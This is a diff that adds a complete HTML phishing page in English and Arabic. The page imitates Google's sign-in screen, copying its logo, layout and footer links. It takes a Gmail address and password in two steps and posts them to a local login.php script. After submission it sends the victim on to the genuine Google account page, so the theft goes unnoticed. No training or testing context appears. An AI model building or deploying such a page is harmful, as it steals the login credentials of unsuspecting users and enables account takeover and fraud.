@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title data-en="Sign in – Google accounts" data-ar="تسجيل الدخول - حسابات Google">Sign in – Google accounts</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+    
+    body {
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      color: #202124;
+    }
+    
+    body[dir="rtl"] {
+      font-family: 'Roboto', 'Tahoma', sans-serif;
+    }
+    
+    .main-content {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    
+    .form-container {
+      width: 100%;
+      /* العودة إلى الحجم الأصلي (450px) وإزالة الظل والحدود */
+      max-width: 450px;
+      text-align: center;
+      padding: 20px;
+    }
+    
+    img {
+      margin-bottom: 20px;
+    }
+    
+    h2 {
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 8px;
+    }
+    
+    h3 {
+      font-size: 16px;
+      font-weight: 400;
+      color: #5f6368;
+      margin-bottom: 24px;
+    }
+    
+    .form-wrapper {
+      display: none;
+    }
+    
+    .form-wrapper.active {
+      display: block;
+      animation: fadeIn 0.3s ease;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    
+    .form__group {
+      position: relative;
+      margin-bottom: 24px;
+    }
+    
+    input {
+      width: 100%;
+      height: 54px;
+      padding: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      outline: none;
+      background-color: white;
+    }
+    
+    input:focus {
+      border: 2px solid #1a73e8;
+    }
+    
+    label {
+      position: absolute;
+      top: 16px;
+      left: 16px;
+      color: #5f6368;
+      background: #fff;
+      padding: 0 4px;
+      transition: all 0.2s ease;
+      pointer-events: none;
+    }
+    
+    body[dir="rtl"] label {
+      left: auto;
+      right: 16px;
+    }
+    
+    input:focus + label,
+    input:not(:placeholder-shown) + label {
+      top: -8px;
+      left: 12px;
+      font-size: 12px;
+      color: #1a73e8;
+    }
+    
+    body[dir="rtl"] input:focus + label,
+    body[dir="rtl"] input:not(:placeholder-shown) + label {
+      left: auto;
+      right: 12px;
+    }
+    
+    .link {
+      display: block;
+      text-align: left;
+      color: #1a73e8;
+      text-decoration: none;
+      margin-bottom: 24px;
+      font-size: 14px;
+      font-weight: 500;
+    }
+    
+    body[dir="rtl"] .link {
+      text-align: right;
+    }
+    
+    .control {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      list-style: none;
+      margin-top: 24px;
+    }
+    
+    .control li a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 14px;
+    }
+    
+    .btn {
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+    
+    .btn:hover {
+      background: #1765cc;
+    }
+    
+    .btn-back {
+      background: transparent;
+      color: #1a73e8;
+      border: none;
+      font-weight: 500;
+      padding: 0;
+      cursor: pointer;
+    }
+    
+    .btn-back:hover {
+      background: transparent;
+      color: #1765cc;
+    }
+    
+    .user-preview {
+      text-align: left;
+      margin-bottom: 16px;
+      font-size: 14px;
+      color: #202124;
+    }
+    
+    body[dir="rtl"] .user-preview {
+      text-align: right;
+    }
+    
+    .user-preview i {
+      color: #5f6368;
+      margin-right: 8px;
+    }
+    
+    body[dir="rtl"] .user-preview i {
+      margin-right: 0;
+      margin-left: 8px;
+    }
+    
+    .footer {
+      background: #f2f2f2;
+      border-top: 1px solid #dadce0;
+      padding: 15px 30px;
+      width: 100%;
+      font-size: 14px;
+      color: #70757a;
+    }
+    
+    .footer-content {
+      max-width: 980px;
+      margin: 0 auto;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    .footer-links {
+      display: flex;
+      list-style: none;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+    
+    .footer-links a {
+      color: #70757a;
+      text-decoration: none;
+    }
+    
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+    
+    .footer-locale {
+      min-width: 200px;
+      margin-top: 10px;
+    }
+    
+    .footer-locale select {
+      padding: 8px 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      background-color: white;
+      font-size: 14px;
+      color: #5f6368;
+      outline: none;
+      cursor: pointer;
+      width: 100%;
+    }
+    
+    @media (max-width: 768px) {
+      .footer-content {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      
+      .footer-links {
+        margin-bottom: 15px;
+      }
+      
+      .footer-locale {
+        width: 100%;
+      }
+    }
+    
+    /* رسالة الخطأ للبريد الإلكتروني */
+    .error-message {
+      color: #d93025;
+      font-size: 12px;
+      text-align: left;
+      margin-top: 4px;
+      display: none;
+    }
+    
+    body[dir="rtl"] .error-message {
+      text-align: right;
+    }
+  </style>
+</head>
+<body>
+  <div class="main-content">
+    <div class="form-container">
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" width="75" height="24" />
+      <h2 id="signIn" data-en="Sign in" data-ar="تسجيل الدخول">Sign in</h2>
+      <h3 id="gmailAccount" class="gmailAccount" data-en="to continue to Google" data-ar="للمتابعة إلى Google">to continue to Google</h3>
+
+      <form action="login.php" method="post" id="authForm" autocomplete="off">
+        <!-- Step 1: Email -->
+        <div class="form-wrapper username active">
+          <div class="form__group">
+            <input type="text" name="email" id="email" required placeholder=" " />
+            <label for="email" data-en="Email or phone" data-ar="البريد الإلكتروني أو الهاتف">Email or phone</label>
+            <!-- رسالة الخطأ للبريد الإلكتروني -->
+            <div class="error-message" id="emailError" data-en="Please enter a valid Gmail address" data-ar="الرجاء إدخال بريد Gmail صحيح">Please enter a valid Gmail address</div>
+          </div>
+          <a href="https://accounts.google.com/signin/recovery" class="link" target="_blank" data-en="Forgot email?" data-ar="نسيت البريد الإلكتروني؟">Forgot email?</a>
+          <ul class="control">
+            <!-- تم إزالة زر الرجوع من هذه الصفحة -->
+            <li><a href="#" id="createAccountBtn" data-en="Create account" data-ar="إنشاء حساب">Create account</a></li>
+            <li><button type="button" class="btn" id="btnNext" data-en="Next" data-ar="التالي">Next</button></li>
+          </ul>
+        </div>
+
+        <!-- Step 2: Password -->
+        <div class="form-wrapper password">
+          <p class="user-preview" id="userPreview"><i class="fas fa-user-circle"></i> <span id="emailPreview">user@gmail.com</span></p>
+          <div class="form__group">
+            <input type="password" name="pass" id="password" required placeholder=" " />
+            <label for="password" data-en="Enter your password" data-ar="أدخل كلمة المرور">Enter your password</label>
+          </div>
+          <a href="#" class="link" data-en="Try another way" data-ar="جرب طريقة أخرى">Try another way</a>
+          <ul class="control">
+            <li><button type="button" class="btn-back" id="btnBack" data-en="Back" data-ar="رجوع">Back</button></li>
+            <li><button type="submit" class="btn" id="btnSubmit" data-en="Next" data-ar="التالي">Next</button></li>
+          </ul>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer-content">
+      <ul class="footer-links">
+        <li><a href="https://support.google.com" target="_blank" data-en="Help" data-ar="مساعدة">Help</a></li>
+        <li><a href="https://policies.google.com/privacy" target="_blank" data-en="Privacy" data-ar="الخصوصية">Privacy</a></li>
+        <li><a href="https://policies.google.com/terms" target="_blank" data-en="Terms" data-ar="الشروط">Terms</a></li>
+      </ul>
+      <div class="footer-locale">
+        <select name="language" id="language-select">
+          <option value="en">English (United States)</option>
+          <option value="ar">العربية (Arabic)</option>
+          <option value="es">Español</option>
+          <option value="fr">Français</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const btnNext = document.getElementById("btnNext");
+      const btnSubmit = document.getElementById("btnSubmit");
+      const btnBack = document.getElementById("btnBack");
+      const createAccountBtn = document.getElementById("createAccountBtn");
+      const usernameDiv = document.querySelector(".username");
+      const passwordDiv = document.querySelector(".password");
+      const signIn = document.getElementById("signIn");
+      const gmailAccount = document.getElementById("gmailAccount");
+      const emailInput = document.getElementById("email");
+      const passwordInput = document.getElementById("password");
+      const userPreview = document.getElementById("userPreview");
+      const emailPreview = document.getElementById("emailPreview");
+      const languageSelect = document.getElementById("language-select");
+      const authForm = document.getElementById("authForm");
+      const emailError = document.getElementById("emailError");
+
+      // Initialize form
+      document.querySelectorAll('.form-wrapper').forEach(wrapper => {
+        if (!wrapper.classList.contains('active')) {
+          wrapper.style.display = 'none';
+        }
+      });
+
+      // Language switcher
+      languageSelect.addEventListener('change', function() {
+        const lang = this.value;
+        if (lang === 'ar') {
+          document.documentElement.lang = 'ar';
+          document.documentElement.dir = 'rtl';
+          document.title = document.querySelector('title').getAttribute('data-ar');
+        } else {
+          document.documentElement.lang = 'en';
+          document.documentElement.dir = 'ltr';
+          document.title = document.querySelector('title').getAttribute('data-en');
+        }
+        
+        document.querySelectorAll('[data-en], [data-ar]').forEach(element => {
+          if (lang === 'ar' && element.hasAttribute('data-ar')) {
+            if (element.tagName === 'INPUT' || element.tagName === 'LABEL') {
+              element.setAttribute('placeholder', element.getAttribute('data-ar'));
+            } else {
+              element.textContent = element.getAttribute('data-ar');
+            }
+          } else {
+            if (element.tagName === 'INPUT' || element.tagName === 'LABEL') {
+              element.setAttribute('placeholder', element.getAttribute('data-en'));
+            } else {
+              element.textContent = element.getAttribute('data-en');
+            }
+          }
+        });
+      });
+
+      // دالة للتحقق من صحة البريد الإلكتروني
+      function isValidEmail(email) {
+        // التحقق من وجود @ و gmail.com
+        const atIndex = email.indexOf('@');
+        if (atIndex === -1) return false;
+        
+        const domain = email.substring(atIndex + 1);
+        return domain.includes('gmail.com');
+      }
+
+      // Next button (email step)
+      btnNext.addEventListener("click", function(e) {
+        e.preventDefault();
+        const email = emailInput.value.trim();
+        const lang = document.documentElement.lang;
+        
+        if (email === "") {
+          alert(lang === 'ar' ? 'الرجاء إدخال البريد الإلكتروني أو الهاتف' : 'Please enter your email or phone.');
+          emailInput.focus();
+          return;
+        }
+        
+        // التحقق من صحة البريد الإلكتروني
+        if (!isValidEmail(email)) {
+          emailError.style.display = 'block';
+          emailInput.style.borderColor = '#d93025';
+          emailInput.focus();
+          
+          // تحديث نص رسالة الخطأ حسب اللغة
+          emailError.textContent = lang === 'ar' ? 
+            'الرجاء إدخال بريد Gmail صحيح (يجب أن يحتوي على @ و gmail.com)' : 
+            'Please enter a valid Gmail address (must include @ and gmail.com)';
+          return;
+        }
+        
+        // إذا كان البريد صحيحاً، إخفاء رسالة الخطأ
+        emailError.style.display = 'none';
+        emailInput.style.borderColor = '#dadce0';
+        
+        // المتابعة للخطوة التالية
+        usernameDiv.classList.remove("active");
+        usernameDiv.style.display = 'none';
+        passwordDiv.classList.add("active");
+        passwordDiv.style.display = 'block';
+        
+        signIn.textContent = lang === 'ar' ? 'مرحبًا' : 'Welcome';
+        gmailAccount.style.display = "none";
+        emailPreview.textContent = email;
+      });
+
+      // Back button (من خطوة كلمة المرور)
+      btnBack.addEventListener("click", function(e) {
+        e.preventDefault();
+        const lang = document.documentElement.lang;
+        
+        // إعادة كل شيء للصفحة الرئيسية
+        usernameDiv.classList.add("active");
+        usernameDiv.style.display = 'block';
+        passwordDiv.classList.remove("active");
+        passwordDiv.style.display = 'none';
+        
+        signIn.textContent = lang === 'ar' ? 'تسجيل الدخول' : 'Sign in';
+        gmailAccount.style.display = "block";
+        gmailAccount.textContent = lang === 'ar' ? 'للمتابعة إلى Google' : 'to continue to Google';
+        
+        // مسح المدخلات
+        emailInput.value = '';
+        passwordInput.value = '';
+        emailPreview.textContent = 'user@gmail.com';
+      });
+
+      // Create account button
+      createAccountBtn.addEventListener("click", function(e) {
+        e.preventDefault();
+        const lang = document.documentElement.lang;
+        
+        usernameDiv.classList.add("active");
+        usernameDiv.style.display = 'block';
+        passwordDiv.classList.remove("active");
+        passwordDiv.style.display = 'none';
+        
+        signIn.textContent = lang === 'ar' ? 'إنشاء حساب' : 'Create account';
+        gmailAccount.style.display = "block";
+        gmailAccount.textContent = lang === 'ar' ? 'لإنشاء حساب Google جديد' : 'to create a new Google account';
+        
+        emailInput.value = '';
+        passwordInput.value = '';
+        emailPreview.textContent = 'user@gmail.com';
+        emailInput.focus();
+      });
+
+      // Form submission
+      authForm.addEventListener("submit", function(e) {
+        const password = passwordInput.value.trim();
+        
+        if (password === "") {
+          e.preventDefault();
+          const lang = document.documentElement.lang;
+          alert(lang === 'ar' ? 'الرجاء إدخال كلمة المرور' : 'Please enter your password.');
+          passwordInput.focus();
+        } else {
+          // إرسال البيانات ثم التوجيه للرابط المطلوب
+          setTimeout(() => {
+            window.location.href = "https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1";
+          }, 300);
+        }
+      });
+    });
+  </script>
+</body>
+</html>
